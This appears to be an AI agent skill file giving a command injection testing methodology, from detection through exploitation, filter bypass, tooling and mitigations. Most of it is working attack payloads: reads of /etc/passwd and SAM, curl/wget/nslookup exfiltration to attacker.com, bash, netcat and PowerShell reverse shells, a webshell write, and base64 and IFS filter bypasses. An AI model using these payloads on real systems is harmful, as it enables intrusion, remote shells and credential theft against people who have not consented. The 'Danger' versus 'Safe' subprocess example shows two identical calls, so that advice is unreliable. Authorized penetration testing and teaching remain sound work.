---
name: command-injection-testing
Description: Professional skills and methodology for command injection vulnerability testing
version: 1.0.0
---

# Command injection vulnerability testing

## Overview

Command injection is a vulnerability that allows an application to execute system commands. When an application passes user input directly to system commands, an attacker can execute arbitrary commands. This skill provides detection, utilization and protection methods for command injection.

## Vulnerability principle

When the application calls system commands, user input is not fully validated and filtered, allowing attackers to inject additional commands.

**Dangerous code examples:**
```php
// PHP
system("ping " . $_GET['ip']);

// Python
os.system("ping " + user_input)

// Node.js
child_process.exec("ping " + user_input)
```

## Test method

### 1. Identify the command execution point

**Common features:**
- Ping function
- DNS query
- File operations
- System information
- Log viewing
- Backup and restore

### 2. Basic detection

**Test command delimiter:**
```
;  # Command separator (Linux/Windows)
&  # Background execution (Linux/Windows)
|  # Pipe character (Linux/Windows)
&& # Logical AND (Linux/Windows)
|| # Logical OR (Linux/Windows)
`  # Command substitution (Linux)
$() # Command substitution (Linux)
```

**Test Payload:**
```
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
```

### 3. Blind command injection

**Time delay detection:**
```
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5
```

**Outside data:**
```
127.0.0.1; curl http://attacker.com/?$(whoami)
127.0.0.1 && wget http://attacker.com/$(cat /etc/passwd)
```

**DNS Takeaway:**
```
127.0.0.1; nslookup $(whoami).attacker.com
```

## Leverage technology

### Basic command execution

**Linux：**
```
; id
; whoami
; uname -a
; cat /etc/passwd
; ls -la
```

**Windows：**
```
& whoami
& ipconfig
& type C:\Windows\System32\drivers\etc\hosts
& dir
```

### File operations

**Read file:**
```
; cat /etc/passwd
; type C:\Windows\System32\config\sam
; head -n 20 /var/log/apache2/access.log
```

**Write to file:**
```
; echo "<?php phpinfo(); ?>" > /tmp/shell.php
; echo "test" > C:\temp\test.txt
```

### Rebound Shell

**Bash：**
```
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Netcat：**
```
; nc -e /bin/bash attacker.com 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

**PowerShell：**
```
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Bypass technology

### Space bypass

```
${IFS}id
${IFS}whoami
$IFS$9id
<>
%09 (Tab)
%20 (Space)
```

### Command separator bypass

**Encoding Bypass:**
```
%3b (;)
%26 (&)
%7c (|)
```

**Newline bypass:**
```
%0a (line feed)
%0d (Enter)
```

### Keyword filter bypass

**Variable splicing:**
```bash
a=w;b=ho;c=ami;$a$b$c
```

**Wildcard:**
```bash
/bin/c?t /etc/passwd
/usr/bin/ca* /etc/passwd
```

**Quotation mark bypass:**
```bash
w'h'o'a'm'i
w"h"o"a"m"i
```

**Backslash:**
```bash
w\ho\am\i
```

**Base64 encoding:**
```bash
echo "d2hvYW1p" | base64 -d | bash
```

### Length limit bypass

**Using File:**
```bash
echo "id" > /tmp/c
sh /tmp/c
```

**Use environment variables:**
```bash
export x='id';$x
```

## Tool usage

### Commix

```bash
#Basic scan
python commix.py -u "http://target.com/ping?ip=127.0.0.1"

#Specify injection point
python commix.py -u "http://target.com/ping?ip=INJECT_HERE" --data="ip=INJECT_HERE"

# Get Shell
python commix.py -u "http://target.com/ping?ip=127.0.0.1" --os-shell
```

### Burp Suite

1. Interception request
2. Send to Intruder
3. Use the command to inject the Payload list
4. Observe response or time delays

## Validation and reporting

### Verification steps

1. Confirm that system commands can be executed
2. Verify command execution results
3. Assess impact (system controls, data breach, etc.)
4. Record a complete POC

### Report Highlights

- Vulnerability location and input parameters
- Executable command types
- Complete utilization steps and POC
- Fix suggestions (input validation, parameterization, whitelisting, etc.)

## Protective measures

### Recommended plan

1. **Avoid command execution**
- Use API instead of system commands
- Use library functions instead of commands

2. **Input verification**
   ```python
   import re
   
   def validate_ip(ip):
       pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
       if not re.match(pattern, ip):
           raise ValueError("Invalid IP")
       parts = ip.split('.')
       if not all(0 <= int(p) <= 255 for p in parts):
           raise ValueError("Invalid IP range")
       return ip
   ```

3. **Parameterized commands**
   ```python
   import subprocess
   
# Danger
   subprocess.call(['ping', '-c', '1', user_input])
   
# Safe - use parameter list
   subprocess.call(['ping', '-c', '1', validated_ip])
   ```

4. **Whitelist Verification**
   ```python
   ALLOWED_COMMANDS = ['ping', 'nslookup']
   ALLOWED_OPTIONS = {'ping': ['-c', '-n']}
   
   if command not in ALLOWED_COMMANDS:
       raise ValueError("Command not allowed")
   ```

5. **Minimum Privileges**
- Run the application as a low-privilege user
- Restrict file system access
- Use chroot or container isolation

6. **Output Filtering**
- Limit output content
- Filter sensitive information
- Record command execution log

## Notes

- Only conducted in an authorized testing environment
- Avoid damage to the system
- Pay attention to the command differences between different operating systems
- Pay attention to the scope of influence of command execution when testing